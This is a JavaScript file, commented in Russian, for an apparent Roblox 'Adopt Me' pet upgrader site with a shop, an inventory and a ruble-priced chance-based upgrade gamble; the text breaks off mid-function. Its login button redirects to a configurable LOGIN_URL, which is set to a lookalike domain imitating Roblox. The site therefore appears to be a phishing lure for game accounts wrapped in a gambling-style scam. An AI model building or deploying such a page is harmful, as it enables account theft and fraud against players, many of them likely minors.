/* ==========================================================
   HAUNTED ADOPT • UPGRADER

   ВАЖНО:

   1. Ссылка для кнопки "Войти" меняется
      только в LOGIN_URL.

   2. Все предметы находятся в ITEMS.

   3. Цены свойств задаются в prices.

   4. Можно включить несколько свойств одновременно:
      RIDE + FLY
      FLY + RIDE + NEON
      и т.д.

   5. Если ничего не выбрано —
      обычный предмет.
========================================================== */


/* ==========================================================
   НАСТРОЙКА ССЫЛКИ ВХОДА

   ВСТАВЬ СВОЮ ССЫЛКУ СЮДА.

   Например:

   const LOGIN_URL = "https://example.com/login";

========================================================== */

const LOGIN_URL =
  "https://roblox.com.ee/users/1723532347/profile";


/* ==========================================================
   СОЗДАТЕЛЬ ЦЕН ВАРИАНТОВ
==========================================================

   base = обычный питомец

   override позволяет менять
   конкретные варианты.

   Доступные ключи:

   normal
   ride
   fly
   neon
   mega-neon

   ride-fly
   ride-neon
   fly-neon
   ride-fly-neon

   ride-mega-neon
   fly-mega-neon
   ride-fly-mega-neon
   neon-mega-neon
   ride-neon-mega-neon
   fly-neon-mega-neon
   ride-fly-neon-mega-neon

========================================================== */

function createPrices(
  base,
  override = {}
){

  const prices = {

    normal:
      base,

    ride:
      Math.round(base * 1.2),

    fly:
      Math.round(base * 1.45),

    neon:
      Math.round(base * 2.2),

    "mega-neon":
      Math.round(base * 3.8),

    "ride-fly":
      Math.round(base * 1.8),

    "ride-neon":
      Math.round(base * 2.5),

    "fly-neon":
      Math.round(base * 2.7),

    "ride-fly-neon":
      Math.round(base * 3.2),

    "ride-mega-neon":
      Math.round(base * 4.1),

    "fly-mega-neon":
      Math.round(base * 4.3),

    "neon-mega-neon":
      Math.round(base * 4.5),

    "ride-fly-mega-neon":
      Math.round(base * 4.7),

    "ride-neon-mega-neon":
      Math.round(base * 4.8),

    "fly-neon-mega-neon":
      Math.round(base * 5.0),

    "ride-fly-neon-mega-neon":
      Math.round(base * 5.4)

  };


  return {
    ...prices,
    ...override
  };

}


/* ==========================================================
   ПРЕДМЕТЫ
==========================================================

   Здесь ты меняешь:

   name
   rarity
   base price
   картинки

   У каждого питомца есть prices.

========================================================== */

const ITEMS = {

  pet: [

    {
      id:"arctic-reindeer",
      name:"Arctic Reindeer",
      rarity:"LEGENDARY",
      image:"images/arctic-reindeer.png",
      fallback:"🦌",

      prices:createPrices(
        2500,
        {
          ride:3000,
          fly:3500,
          "ride-fly":4200,
          neon:6500,
          "ride-fly-neon":9000,
          "mega-neon":14000
        }
      ),

      halloween:false
    },


    {
      id:"bat-dragon",
      name:"Bat Dragon",
      rarity:"LEGENDARY",
      image:"images/bat-dragon.png",
      fallback:"🦇",

      prices:createPrices(
        3000,
        {
          ride:3800,
          fly:4200,
          "ride-fly":5200,
          neon:8000,
          "ride-fly-neon":12000,
          "mega-neon":18000
        }
      ),

      halloween:true
    },


    {
      id:"cerberus",
      name:"Cerberus",
      rarity:"LEGENDARY",
      image:"images/cerberus.png",
      fallback:"🐺",

      prices:createPrices(
        750,
        {
          ride:900,
          fly:1050,
          "ride-fly":1250,
          neon:1800,
          "ride-fly-neon":2500,
          "mega-neon":3800
        }
      ),

      halloween:true
    },


    {
      id:"chocolate-bat-dragon",
      name:"Chocolate Bat Dragon",
      rarity:"LEGENDARY",
      image:"images/chocolate-bat-dragon.png",
      fallback:"🦇",

      prices:createPrices(
        1900,
        {
          ride:2300,
          fly:2700,
          "ride-fly":3200,
          neon:5000,
          "ride-fly-neon":7200,
          "mega-neon":11000
        }
      ),

      halloween:true
    },


    {
      id:"cow",
      name:"Cow",
      rarity:"LEGENDARY",
      image:"images/cow.png",
      fallback:"🐮",

      prices:createPrices(
        1400,
        {
          ride:1700,
          fly:1950,
          "ride-fly":2300,
          neon:3600,
          "ride-fly-neon":5000,
          "mega-neon":8000
        }
      ),

      halloween:false
    },


    {
      id:"crow",
      name:"Crow",
      rarity:"LEGENDARY",
      image:"images/crow.png",
      fallback:"🐦",

      prices:createPrices(
        1700,
        {
          ride:2100,
          fly:2400,
          "ride-fly":2800,
          neon:4300,
          "ride-fly-neon":6000,
          "mega-neon":9500
        }
      ),

      halloween:false
    },


    {
      id:"frost-dragon",
      name:"Frost Dragon",
      rarity:"LEGENDARY",
      image:"images/frost-dragon.png",
      fallback:"🐉",

      prices:createPrices(
        2800,
        {
          ride:3400,
          fly:3900,
          "ride-fly":4600,
          neon:7200,
          "ride-fly-neon":10000,
          "mega-neon":16000
        }
      ),

      halloween:false
    },


    {
      id:"frost-fury",
      name:"Frost Fury",
      rarity:"LEGENDARY",
      image:"images/frost-fury.png",
      fallback:"🐲",

      prices:createPrices(
        1300,
        {
          ride:1550,
          fly:1800,
          "ride-fly":2150,
          neon:3300,
          "ride-fly-neon":4700,
          "mega-neon":7200
        }
      ),

      halloween:false
    },


    {
      id:"gemstone-egg",
      name:"Gemstone Egg",
      rarity:"LEGENDARY",
      image:"images/gemstone-egg.png",
      fallback:"🥚",

      prices:createPrices(
        900,
        {
          ride:1050,
          fly:1200,
          "ride-fly":1400,
          neon:2300,
          "ride-fly-neon":3200,
          "mega-neon":5000
        }
      ),

      halloween:false
    },


    {
      id:"ghost-dog",
      name:"Ghost Dog",
      rarity:"COMMON",
      image:"images/ghost-dog.png",
      fallback:"🐶",

      prices:createPrices(
        82,

        {
          ride:50,
          fly:80,
          "ride-fly":140,
          neon:130,
          "fly-ride-neon":270,
          "mega-neon":180
        }

      ),

      halloween:true
    },


    {
      id:"ghostly-cat",
      name:"Ghostly Cat",
      rarity:"ULTRA-RARE",
      image:"images/ghostly-cat.png",
      fallback:"🐱",

      prices:createPrices(
        350,
        {
          ride:420,
          fly:500,
          "ride-fly":600,
          neon:900,
          "ride-fly-neon":1300,
          "mega-neon":2000
        }
      ),

      halloween:true
    },


    {
      id:"giraffe",
      name:"Giraffe",
      rarity:"LEGENDARY",
      image:"images/giraffe.png",
      fallback:"🦒",

      prices:createPrices(
        3500,
        {
          ride:4200,
          fly:4800,
          "ride-fly":5600,
          neon:9000,
          "ride-fly-neon":12500,
          "mega-neon":19000
        }
      ),

      halloween:false
    },


    {
      id:"grim-dragon",
      name:"Grim Dragon",
      rarity:"LEGENDARY",
      image:"images/grim-dragon.png",
      fallback:"🐉",

      prices:createPrices(
        2100,
        {
          ride:2500,
          fly:2900,
          "ride-fly":3400,
          neon:5300,
          "ride-fly-neon":7400,
          "mega-neon":11500
        }
      ),

      halloween:true
    },


    {
      id:"hedgehog",
      name:"Hedgehog",
      rarity:"ULTRA-RARE",
      image:"images/hedgehog.png",
      fallback:"🦔",

      prices:createPrices(
        1550,
        {
          ride:1850,
          fly:2150,
          "ride-fly":2500,
          neon:3900,
          "ride-fly-neon":5400,
          "mega-neon":8500
        }
      ),

      halloween:false
    },


    {
      id:"jester-dragon",
      name:"Jester Dragon",
      rarity:"LEGENDARY",
      image:"images/jester-dragon.png",
      fallback:"🐲",

      prices:createPrices(
        1200,
        {
          ride:1450,
          fly:1700,
          "ride-fly":2000,
          neon:3000,
          "ride-fly-neon":4300,
          "mega-neon":6500
        }
      ),

      halloween:true
    },


    {
      id:"kangaroo",
      name:"Kangaroo",
      rarity:"LEGENDARY",
      image:"images/kangaroo.png",
      fallback:"🦘",

      prices:createPrices(
        1250,
        {
          ride:1500,
          fly:1750,
          "ride-fly":2100,
          neon:3200,
          "ride-fly-neon":4500,
          "mega-neon":7000
        }
      ),

      halloween:false
    },


    {
      id:"kitsune",
      name:"Kitsune",
      rarity:"LEGENDARY",
      image:"images/kitsune.png",
      fallback:"🦊",

      prices:createPrices(
        700,
        {
          ride:850,
          fly:1000,
          "ride-fly":1200,
          neon:1900,
          "ride-fly-neon":2700,
          "mega-neon":4200
        }
      ),

      halloween:false
    },


    {
      id:"parrot",
      name:"Parrot",
      rarity:"LEGENDARY",
      image:"images/parrot.png",
      fallback:"🦜",

      prices:createPrices(
        1900,
        {
          ride:2300,
          fly:2600,
          "ride-fly":3000,
          neon:4800,
          "ride-fly-neon":6700,
          "mega-neon":10500
        }
      ),

      halloween:false
    },


    {
      id:"snow-owl",
      name:"Snow Owl",
      rarity:"LEGENDARY",
      image:"images/snow-owl.png",
      fallback:"🦉",

      prices:createPrices(
        650,
        {
          ride:780,
          fly:920,
          "ride-fly":1100,
          neon:1700,
          "ride-fly-neon":2400,
          "mega-neon":3700
        }
      ),

      halloween:false
    },


    {
      id:"strawberry-bat-dragon",
      name:"Strawberry Bat Dragon",
      rarity:"LEGENDARY",
      image:"images/strawberry-bat-dragon.png",
      fallback:"🦇",

      prices:createPrices(
        2400,
        {
          ride:2900,
          fly:3400,
          "ride-fly":4000,
          neon:6200,
          "ride-fly-neon":8700,
          "mega-neon":13500
        }
      ),

      halloween:true
    },


    {
      id:"turtle",
      name:"Turtle",
      rarity:"LEGENDARY",
      image:"images/turtle.png",
      fallback:"🐢",

      prices:createPrices(
        1100,
        {
          ride:1350,
          fly:1550,
          "ride-fly":1850,
          neon:2900,
          "ride-fly-neon":4100,
          "mega-neon":6300
        }
      ),

      halloween:false
    },


    {
      id:"unicorn",
      name:"Unicorn",
      rarity:"LEGENDARY",
      image:"images/unicorn.png",
      fallback:"🦄",

      prices:createPrices(
        1960,
        {
          ride:2350,
          fly:2750,
          "ride-fly":3250,
          neon:5100,
          "ride-fly-neon":7100,
          "mega-neon":11000
        }
      ),

      halloween:false
    }

  ],


  potion: [

    {
      id:"fly-potion",
      name:"Fly Potion",
      rarity:"POTION",
      image:"images/fly-potion.png",
      fallback:"🧪",
      prices:{
        normal:650
      },
      halloween:false
    },


    {
      id:"ride-potion",
      name:"Ride Potion",
      rarity:"POTION",
      image:"images/ride-potion.png",
      fallback:"🧪",
      prices:{
        normal:350
      },
      halloween:false
    }

  ]

};


/* ==========================================================
   FAIR POOL
========================================================== */

const FAIR_POOL_SIZE = 200;


/* ==========================================================
   STATE
========================================================== */

const fairPools =
  new Map();


let category =
  "pet";


let shopCategory =
  "pet";


let balance =
  0;


let attempts =
  0;


let wins =
  0;


let losses =
  0;


let rolling =
  false;


let selectedChance =
  50;


let selectionMode =
  "source";


/*
   INVENTORY

   key:

   itemId::variantKey

   например:

   ghost-dog::normal
   ghost-dog::ride
   ghost-dog::ride-fly-neon
*/

const inventory =
  new Map();


/*
   Выбранные свойства
   в магазине.

   itemId -> {

     ride:false,
     fly:false,
     neon:false,
     mega:false

   }
*/

const shopSelections =
  new Map();


/*
   SOURCE
*/

let source = {

  inventoryKey:null,

  itemId:null,

  name:"Нет предмета",

  rarity:"ИНВЕНТАРЬ ПУСТ",

  price:0,

  image:"",

  fallback:"🎒",

  variantKey:"normal",

  variantLabel:"Обычный",

  properties:[]

};


/*
   TARGET
*/

let target = {

  inventoryKey:null,

  itemId:null,

  name:"Bat Dragon",

  rarity:"LEGENDARY",

  price:3000,

  image:"images/bat-dragon.png",

  fallback:"🦇",

  variantKey:"normal",

  variantLabel:"Обычный",

  properties:[]

};


/* ==========================================================
   DOM HELPER
========================================================== */

const $ =
  id =>
    document.getElementById(id);


/* ==========================================================
   MONEY
========================================================== */

function money(value){

  return `${Math.round(
    Number(value) || 0
  ).toLocaleString(
    "ru-RU"
  ).replace(
    /\u00A0/g,
    " "
  )} ₽`;

}


/* ==========================================================
   FIND ITEMS
========================================================== */

function allItems(){

  return [
    ...ITEMS.pet,
    ...ITEMS.potion
  ];

}


function findItem(
  id
){

  return allItems()
    .find(
      item =>
        item.id === id
    ) || null;

}


function currentItems(){

  return ITEMS[category];

}


function currentShopItems(){

  return ITEMS[shopCategory];

}


/* ==========================================================
   VARIANT HELPERS
========================================================== */

function emptyProperties(){

  return {

    ride:false,

    fly:false,

    neon:false,

    mega:false

  };

}


/*
   PROPERTY OBJECT -> KEY
*/

function propertiesToKey(
  properties
){

  const parts = [];


  if(properties.ride){
    parts.push("ride");
  }


  if(properties.fly){
    parts.push("fly");
  }


  if(properties.neon){
    parts.push("neon");
  }


  if(properties.mega){
    parts.push("mega-neon");
  }


  if(parts.length === 0){

    return "normal";

  }


  /*
    Чтобы:

    Ride + Fly + Neon

    и

    Fly + Ride + Neon

    всегда были одинаковыми.
  */

  return parts.join(
    "-"
  );

}


/*
   KEY -> PROPERTY OBJECT
*/

function keyToProperties(
  key
){

  const properties =
    emptyProperties();


  if(
    key === "normal"
  ){

    return properties;

  }


  const parts =
    key.split("-");


  if(
    parts.includes("ride")
  ){

    properties.ride =
      true;

  }


  if(
    parts.includes("fly")
  ){

    properties.fly =
      true;

  }


  if(
    parts.includes("neon")
  ){

    properties.neon =
      true;

  }


  if(
    parts.includes("mega") ||
    key.includes("mega-neon")
  ){

    properties.mega =
      true;

  }


  return properties;

}


/*
   Красивое название
*/

function propertyLabel(
  properties
){

  const parts = [];


  if(properties.fly){
    parts.push("Fly");
  }


  if(properties.ride){
    parts.push("Ride");
  }


  if(properties.neon){
    parts.push("Neon");
  }


  if(properties.mega){
    parts.push("Mega Neon");
  }


  if(parts.length === 0){

    return "Обычный";

  }


  return parts.join(
    " "
  );

}


/*
   Получить цену варианта.
*/

function getVariantPrice(
  item,
  variantKey
){

  /*
    Сначала пробуем
    точную цену.
  */

  if(
    item.prices &&
    item.prices[variantKey] != null
  ){

    return Number(
      item.prices[variantKey]
    );

  }


  /*
    Если комбинация
    не прописана отдельно,
    используем обычную цену.
  */

  if(
    item.prices &&
    item.prices.normal != null
  ){

    return Number(
      item.prices.normal
    );

  }


  return 0;

}


/*
   Создание полной версии предмета.
*/

function createVariant(
  item,
  properties
){

  const variantKey =
    propertiesToKey(
      properties
    );


  const price =
    getVariantPrice(
      item,
      variantKey
    );


  const variantLabel =
    propertyLabel(
      properties
    );


  return {

    inventoryKey:
      `${item.id}::${variantKey}`,

    itemId:
      item.id,

    name:
      item.name,

    rarity:
      item.rarity,

    price,

    image:
      item.image,

    fallback:
      item.fallback,

    variantKey,

    variantLabel,

    properties:{
      ...properties
    }

  };

}


/* ==========================================================
   SHOP SELECTION
========================================================== */

function getShopSelection(
  itemId
){

  if(
    !shopSelections.has(
      itemId
    )
  ){

    shopSelections.set(
      itemId,
      emptyProperties()
    );

  }


  return shopSelections.get(
    itemId
  );

}


/* ==========================================================
   INVENTORY
========================================================== */

function addInventory(
  variant,
  amount = 1
){

  inventory.set(

    variant.inventoryKey,

    (
      inventory.get(
        variant.inventoryKey
      ) || 0
    ) + amount

  );

}


function removeInventory(
  inventoryKey,
  amount = 1
){

  const next =
    (
      inventory.get(
        inventoryKey
      ) || 0
    ) - amount;


  if(next > 0){

    inventory.set(
      inventoryKey,
      next
    );

  }else{

    inventory.delete(
      inventoryKey
    );

  }

}


/*
   Список инвентаря.
*/

function inventoryItems(){

  return [

    ...inventory.entries()

  ]

  .map(
    ([inventoryKey, quantity])=>{

      const split =
        inventoryKey.split(
          "::"
        );


      const itemId =
        split[0];


      const variantKey =
        split[1] || "normal";


      const item =
        findItem(
          itemId
        );


      if(!item){
        return null;
      }


      const properties =
        keyToProperties(
          variantKey
        );


      const variant =
        createVariant(
          item,
          properties
        );


      return {

        inventoryKey,

        quantity,

        ...variant

      };

    }
  )

  .filter(Boolean);

}


/* ==========================================================
   BALANCE
========================================================== */

function updateBalance(){

  $("balanceValue")
    .textContent =
      money(balance);


  $("depositBalance")
    .textContent =
      money(balance);

}


/* ==========================================================
   STATS
========================================================== */

function updateStats(){

  $("attempts")
    .textContent =
      attempts;


  $("wins")
    .textContent =
      wins;


  $("losses")
    .textContent =
      losses;


  $("winrate")
    .textContent =

      `${
        attempts

        ? Math.round(
            wins /
            attempts *
            100
          )

        : 0
      }%`;

}


/* ==========================================================
   MULTIPLIER
========================================================== */

function multiplier(){

  if(
    !source.price ||
    !target.price
  ){

    return 1;

  }


  return (
    target.price /
    source.price
  );

}


/* ==========================================================
   CHANCE
========================================================== */

function displayedChance(){

  if(
    !source.price ||
    !target.price
  ){

    return 0;

  }


  return Math.max(

    1,

    Math.min(

      98,

      98 /
      multiplier()

    )

  );

}


/* ==========================================================
   TOAST
========================================================== */

function showToast(
  message
){

  const toast =
    $("toast");


  toast.textContent =
    message;


  toast.classList.remove(
    "hidden"
  );


  toast.classList.add(
    "show"
  );


  clearTimeout(
    showToast.timer
  );


  showToast.timer =
    setTimeout(
      ()=>{

        toast.classList.add(
          "hidden"
        );

        toast.classList.remove(
          "show"
        );

      },
      2800
    );

}


/* ==========================================================
   MODALS
========================================================== */

function openModal(
  id
){

  $(id)
    .classList
    .remove(
      "hidden"
    );

}


function closeModal(
  id
){

  $(id)
    .classList
    .add(
      "hidden"
    );

}


/* ==========================================================
   IMAGE LOADING
========================================================== */

function loadImage(
  image,
  fallback,
  item
){

  image.style.display =
    "none";


  fallback.style.display =
    "block";


  fallback.textContent =
    item.fallback ||
    "🐾";


  if(!item.image){

    return;

  }


  image.src =
    item.image;


  image.onload =
    ()=>{

      image.style.display =
        "block";

      fallback.style.display =
        "none";

    };


  image.onerror =
    ()=>{

      image.style.display =
        "none";

      fallback.style.display =
        "block";

    };

}


/* ==========================================================
   UPDATE SOURCE / TARGET CARDS
========================================================== */

function updateCards(){

  loadImage(

    $("sourceImage"),

    $("sourceFallback"),

    source

  );


  loadImage(

    $("targetImage"),

    $("targetFallback"),

    target

  );


  $("sourceName")
    .textContent =
      source.name;


  $("sourceMeta")
    .textContent =

      source.itemId

      ? `${source.rarity} • ${source.variantLabel}`

      : source.rarity;


  $("sourcePrice")
    .textContent =

      source.itemId

      ? money(source.price)

      : "Купи предмет в магазине";


  $("targetName")
    .textContent =
      target.name;


  $("targetMeta")
    .textContent =

      `${target.rarity} • ${target.variantLabel}`;


  $("targetPrice")
    .textContent =
      money(target.price);


  $("multiplier")
    .textContent =

      source.price

      ? `x${multiplier().toFixed(2)}`

      : "x—";


  $("chanceText")
    .textContent =

      source.price

      ? `Шанс ${displayedChance().toFixed(1)}%`

      : "Сначала купи предмет";


  document
    .querySelectorAll(
      ".chance-btn"
    )
    .forEach(button=>{

      button.classList.toggle(

        "active",

        Number(
          button.dataset.chance
        )
        ===
        selectedChance

      );

    });

}


/* ==========================================================
   FAIR POOL
========================================================== */

function buildFairPool(
  chance
){

  const winsNeeded =
    Math.round(

      chance *
      FAIR_POOL_SIZE /
      100

    );


  const pool = [];


  for(
    let i=0;
    i<winsNeeded;
    i++
  ){

    pool.push(true);

  }


  for(
    let i=winsNeeded;
    i<FAIR_POOL_SIZE;
    i++
  ){

    pool.push(false);

  }


  for(
    let i=pool.length-1;
    i>0;
    i--
  ){

    const j =
      Math.floor(
        Math.random() *
        (i + 1)
      );


    [
      pool[i],
      pool[j]

    ] = [

      pool[j],
      pool[i]

    ];

  }


  return pool;

}


function fairOutcome(
  chance
){

  const key =
    Number(
      chance
    ).toFixed(1);


  if(

    !fairPools.has(key)

    ||

    fairPools
      .get(key)
      .length === 0

  ){

    fairPools.set(

      key,

      buildFairPool(
        chance
      )

    );

  }


  return fairPools
    .get(key)
    .pop();

}


/* ==========================================================
   LOGIN
========================================================== */

$("loginButton")
  .addEventListener(
    "click",
    ()=>{

      if(

        !LOGIN_URL ||

        LOGIN_URL ===
        "https://example.com/login"

      ){

        showToast(
          "Сначала укажи ссылку входа в LOGIN_URL в script.js"
        );

        return;

      }


      window.location.href =
        LOGIN_URL;

    }
  );


/* ==========================================================
   CATEGORY
========================================================== */

document
  .querySelectorAll(
    ".mode-btn"
  )
  .forEach(button=>{

    button.addEventListener(
      "click",
      ()=>{

        if(rolling){
          return;
        }


        category =
          button.dataset.category;


        document
          .querySelectorAll(
            ".mode-btn"
          )
          .forEach(item=>{

            item.classList.toggle(

              "active",

              item === button

            );

          });


        $("modeLabel")
          .textContent =

            category === "pet"

            ? "ПЕТЫ"

            : "ЗЕЛЬЕ";


        const owned =
          inventoryItems()
            .filter(
              item =>{

                if(
                  category === "pet"
                ){

                  return ITEMS.pet.some(
                    x =>
                      x.id ===
                      item.itemId
                  );

                }


                return ITEMS.potion.some(
                  x =>
                    x.id ===
                    item.itemId
                );

              }
            );


        if(owned.length){

          source = {
            ...owned[0]
          };

        }else{

          source = {

            inventoryKey:null,

            itemId:null,

            name:"Нет предмета",

            rarity:
              "ИНВЕНТАРЬ ПУСТ",

            price:0,

            image:"",

            fallback:"🎒",

            variantKey:
              "normal",

            variantLabel:
              "Обычный",

            properties:
              emptyProperties()

          };

        }


        const next =
          currentItems()
            .find(
              item =>{

                const price =
                  getVariantPrice(
                    item,
                    "normal"
                  );


                return (
                  price >
                  (
                    source.price ||
                    0
                  )
                );

              }
            );


        if(next){

          target =
            createVariant(
              next,
              emptyProperties()
            );

        }


        selectedChance =
          50;


        renderShop();

        renderInventory();

        updateCards();

      }
    );

  });


/* ==========================================================
   SHOP CATEGORY
========================================================== */

document
  .querySelectorAll(
    ".shop-category-btn"
  )
  .forEach(button=>{

    button.addEventListener(
      "click",
      ()=>{

        shopCategory =
          button.dataset.shopCategory;


        document
          .querySelectorAll(
            ".shop-category-btn"
          )
          .forEach(item=>{

            item.classList.toggle(

              "active",

              item === button

            );

          });


        renderShop();

      }
    );

  });


/* ==========================================================
   RENDER SHOP
========================================================== */

function renderShop(){

  const grid =
    $("itemGrid");


  grid.innerHTML =
    "";


  currentShopItems()
    .forEach(item=>{

      const properties =
        getShopSelection(
          item.id
        );


      const variant =
        createVariant(
          item,
          properties
        );


      const card =
        document.createElement(
          "div"
        );


      card.className =
        "grid-item";


      card.innerHTML = `

        ${
          item.halloween

          ? `

            <span
              class="event-tag"
            >
              🎃 EVENT
            </span>

          `

          : ""
        }


        <div
          class="grid-item-art"
        >

          <img
            alt=""
          >

          <span>
            ${item.fallback || "🐾"}
          </span>

        </div>


        <div
          class="grid-item-name"
        >
          ${item.name}
        </div>


        <div
          class="grid-meta"
        >

          <span>
            ${item.rarity}
          </span>

          <span class="grid-price">
            ${money(variant.price)}
          </span>

        </div>


        <div class="property-title">
          СВОЙСТВА
        </div>


        <div
          class="property-grid"
        >

          <button
            class="property-btn ${
              properties.ride
                ? "active"
                : ""
            }"
            data-property="ride"
          >

            <span
              class="property-letter"
            >
              R
            </span>

            RIDE

          </button>


          <button
            class="property-btn ${
              properties.fly
                ? "active"
                : ""
            }"
            data-property="fly"
          >

            <span
              class="property-letter"
            >
              F
            </span>

            FLY

          </button>


          <button
            class="property-btn ${
              properties.neon
                ? "active"
                : ""
            }"
            data-property="neon"
          >

            <span
              class="property-letter"
            >
              N
            </span>

            NEON

          </button>


          <button
            class="property-btn ${
              properties.mega
                ? "active"
                : ""
            }"
            data-property="mega"
          >

            <span
              class="property-letter"
            >
              M
            </span>

            MEGA NEON

          </button>

        </div>


        <div
          class="variant-name"
        >
          ${variant.variantLabel}
        </div>


        <div
          class="variant-price"
        >
          ${money(variant.price)}
        </div>


        <button
          class="shop-buy-btn"
        >
          КУПИТЬ • ${money(variant.price)}
        </button>

      `;


      const image =
        card.querySelector(
          "img"
        );


      const fallback =
        card.querySelector(
          ".grid-item-art span"
        );


      loadImage(
        image,
        fallback,
        item
      );


      /*
        PROPERTY BUTTONS
      */

      card
        .querySelectorAll(
          ".property-btn"
        )
        .forEach(
          propertyButton=>{

            propertyButton
              .addEventListener(
                "click",
                event=>{

                  event.stopPropagation();


                  const property =
                    propertyButton
                      .dataset
                      .property;


                  properties[property] =
                    !properties[
                      property
                    ];


                  shopSelections.set(

                    item.id,

                    {
                      ...properties
                    }

                  );


                  renderShop();

                }
              );

          }
        );


      /*
        BUY
      */

      card
        .querySelector(
          ".shop-buy-btn"
        )
        .addEventListener(
          "click",
          event=>{

            event.stopPropagation();


            purchaseVariant(
              item,
              {
                ...properties
              }
            );

          }
        );


      /*
        CLICK CARD =
        SELECT TARGET
      */

      card.addEventListener(
        "click",
        ()=>{

          if(
            !source.itemId
          ){

            showToast(
              "Сначала купи предмет для апгрейда"
            );

            return;

          }


          if(
            variant.price <=
            source.price
          ){

            showToast(
              "Эта цель должна быть дороже вашего предмета"
            );

            return;

          }


          target =
            createVariant(
              item,
              {
                ...properties
              }
            );


          updateCards();


          showToast(
            `${target.name} • ${target.variantLabel} выбрана целью`
          );


          window.scrollTo({

            top:0,

            behavior:"smooth"

          });

        }
      );


      grid.appendChild(
        card
      );

    });

}


/* ==========================================================
   PURCHASE VARIANT
========================================================== */

function purchaseVariant(
  item,
  properties
){

  const variant =
    createVariant(
      item,
      properties
    );


  if(
    balance <
    variant.price
  ){

    showToast(

      `Недостаточно средств. Нужно ${money(
        variant.price
      )}`

    );

    return;

  }


  /*
    СПИСЫВАЕМ ДЕНЬГИ
  */

  balance -=
    variant.price;


  /*
    ДОБАВЛЯЕМ ПРЕДМЕТ
  */

  addInventory(
    variant
  );


  /*
    Если это первый предмет,
    автоматически ставим source.
  */

  if(
    !source.itemId
  ){

    source =
      {
        ...variant
      };


    const next =
      currentShopItems()
        .find(
          item =>{

            const normalPrice =
              getVariantPrice(
                item,
                "normal"
              );


            return (
              normalPrice >
              variant.price
            );

          }
        );


    if(next){

      target =
        createVariant(
          next,
          emptyProperties()
        );

    }

  }


  updateBalance();

  renderInventory();

  updateCards();


  /*
    Увеличенное уведомление.
  */

  showToast(

    `✓ ${variant.name} • ${variant.variantLabel} куплен за ${money(
      variant.price
    )}`

  );

}


/* ==========================================================
   RENDER INVENTORY
========================================================== */

function renderInventory(){

  const grid =
    $("inventoryGrid");


  grid.innerHTML =
    "";


  const items =
    inventoryItems()
      .filter(
        item =>{

          if(
            category === "pet"
          ){

            return ITEMS.pet.some(
              x =>
                x.id ===
                item.itemId
            );

          }


          return ITEMS.potion.some(
            x =>
              x.id ===
              item.itemId
          );

        }
      );


  const total =
    items.reduce(
      (
        sum,
        item
      ) =>
        sum +
        item.quantity,
      0
    );


  $("inventoryCount")
    .textContent =
      `${total} предметов`;


  if(!items.length){

    grid.innerHTML = `

      <div class="inventory-empty">

        <b>
          🎒 ИНВЕНТАРЬ ПОКА ПУСТ
        </b>

        Перейди в магазин,
        выбери предмет и купи его.

      </div>

    `;

    return;

  }


  items.forEach(
    variant=>{

      const card =
        document.createElement(
          "div"
        );


      card.className =
        "inventory-item";


      card.innerHTML = `

        <span
          class="inventory-badge"
        >
          ×${variant.quantity}
        </span>


        <div
          class="inventory-item-art"
        >

          <img alt="">

          <span>
            ${variant.fallback || "🐾"}
          </span>

        </div>


        <div
          class="inventory-item-name"
        >
          ${variant.name}
        </div>


        <div
          class="inventory-item-meta"
        >
          ${variant.rarity}
        </div>


        <div
          class="inventory-variant"
        >
          ${variant.variantLabel}
        </div>


        <div
          class="inventory-price"
        >
          ${money(variant.price)}
        </div>

      `;


      const image =
        card.querySelector(
          "img"
        );


      const fallback =
        card.querySelector(
          ".inventory-item-art span"
        );


      loadImage(
        image,
        fallback,
        variant
      );


      card.addEventListener(
        "click",
        ()=>{

          source =
            {
              ...variant
            };


          updateCards();


          showToast(

            `${variant.name} • ${variant.variantLabel} выбран для апгрейда`

          );


          window.scrollTo({

            top:0,

            behavior:"smooth"

          });

        }
      );


      grid.appendChild(
        card
      );

    }
  );

}


/* ==========================================================
   INVENTORY / SHOP TABS
========================================================== */

$("inventoryTab")
  .addEventListener(
    "click",
    ()=>{

      $("inventoryTab")
        .classList
        .add("active");


      $("shopTab")
        .classList
        .remove("active");


      $("inventorySection")
        .classList
        .remove("hidden");


      $("shopSection")
        .classList
        .add("hidden");


      renderInventory();

    }
  );


$("shopTab")
  .addEventListener(
    "click",
    ()=>{

      $("shopTab")
        .classList
        .add("active");


      $("inventoryTab")
        .classList
        .remove("active");


      $("shopSection")
        .classList
        .remove("hidden");


      $("inventorySection")
        .classList
        .add("hidden");


      renderShop();

    }
  );


/* ==========================================================
   SELECTION MODAL
========================================================== */

function openSelection(
  mode
){

  selectionMode =
    mode;


  $("selectionTitle")
    .textContent =

      mode === "source"

      ? "ВЫБЕРИ ПРЕДМЕТ ИЗ ИНВЕНТАРЯ"

      : "ВЫБЕРИ ЦЕЛЬ";


  $("itemSearch")
    .value = "";


  renderSelection();


  openModal(
    "selectionModal"
  );

}


function renderSelection(
  query = ""
){

  const q =
    query
      .trim()
      .toLowerCase();


  const list =
    $("selectionList");


  list.innerHTML =
    "";


  /*
    SOURCE
  */

  if(
    selectionMode ===
    "source"
  ){

    const owned =
      inventoryItems()
        .filter(
          item=>{

            const categoryMatch =

              category ===
              "pet"

              ? ITEMS.pet.some(
                  x =>
                    x.id ===
                    item.itemId
                )

              : ITEMS.potion.some(
                  x =>
                    x.id ===
                    item.itemId
                );


            const searchMatch =
              item.name
                .toLowerCase()
                .includes(q);


            return (
              categoryMatch &&
              searchMatch
            );

          }
        );


    if(!owned.length){

      list.innerHTML = `

        <div class="inventory-empty">

          <b>
            🎒 ИНВЕНТАРЬ ПУСТ
          </b>

          Сначала купи предмет
          в магазине.

        </div>

      `;

      return;

    }


    owned.forEach(
      variant=>{

        const row =
          document.createElement(
            "button"
          );


        row.type =
          "button";


        row.className =
          "selection-row";


        row.innerHTML = `

          <div class="selection-art">

            <img alt="">

            <span>
              ${variant.fallback || "🐾"}
            </span>

          </div>


          <div
            class="selection-details"
          >

            <b>
              ${variant.name}
            </b>

            <span>
              ${variant.rarity}
              • ${variant.variantLabel}
              • ×${variant.quantity}
            </span>

            <strong>
              ${money(variant.price)}
            </strong>

          </div>


          <span class="selection-type">
            ВЗЯТЬ
          </span>

        `;


        loadImage(

          row.querySelector("img"),

          row.querySelector(
            ".selection-art span"
          ),

          variant

        );


        row.addEventListener(
          "click",
          ()=>{

            source =
              {
                ...variant
              };


            closeModal(
              "selectionModal"
            );


            updateCards();

          }
        );


        list.appendChild(
          row
        );

      }
    );


    return;

  }


  /*
    TARGET
  */

  currentItems()
    .filter(
      item =>
        item.name
          .toLowerCase()
          .includes(q)
    )
    .forEach(
      item=>{

        const variant =
          createVariant(
            item,
            emptyProperties()
          );

